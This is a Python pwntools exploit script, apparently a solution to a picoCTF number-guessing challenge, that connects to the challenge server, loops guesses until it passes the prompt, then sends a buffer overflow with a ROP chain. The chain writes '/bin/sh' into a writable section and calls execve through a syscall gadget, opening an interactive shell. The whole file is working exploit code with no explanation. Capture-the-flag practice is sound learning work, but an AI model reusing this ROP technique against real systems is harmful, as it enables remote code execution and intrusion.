#!/usr/bin/python3

from pwn import *

exe = ELF("./vuln",checksec=False)

# r = process(exe.path)
r = remote("jupiter.challenges.picoctf.org" ,28953)

syscall = 0x000000000040137c
pop_rdi = 0x0000000000400696
pop_rsi = 0x0000000000410ca3
pop_rdx = 0x000000000044a6b5
pop_rax = 0x00000000004163f4
rw_section  = 0x6b7070
mov_rdx_address = 0x48dd71

# 
# payload = b'A'*120 + p64(pop_rdi) + p64(rw_section)
# payload += p64(0x410a10) + 
# payload += p64(pop_rdx) + p64(0) + p64(pop_rax) + p64(0x3b)
# payload	+= p64(pop_rsi) + p64(0) +p64(pop_rdi) + p64(rw_section)
# payload += p64(syscall)


payload = b'A'*120 + p64(pop_rdx) + b'/bin/sh\00'
payload += p64(pop_rax) + p64(rw_section)
payload += p64(mov_rdx_address)
payload += p64(pop_rdx) + p64(0) + p64(pop_rax) + p64(0x3b)
payload	+= p64(pop_rsi) + p64(0) +p64(pop_rdi) + p64(rw_section)
payload += p64(syscall)


r.sendlineafter(b'What number would you like to guess?\n',b'1')
# input()
# r.sendlineafter(b'What number would you like to guess?\n',b'1')
# r.sendlineafter(b'What number would you like to guess?\n',b'1')




for i in range(1000):
	a = r.recv().decode()
	print(a)
	if 'Nope!\n'not in a:
		break
	r.recv()
	r.sendline(b'1')


# input()
r.sendline(payload)
r.interactive()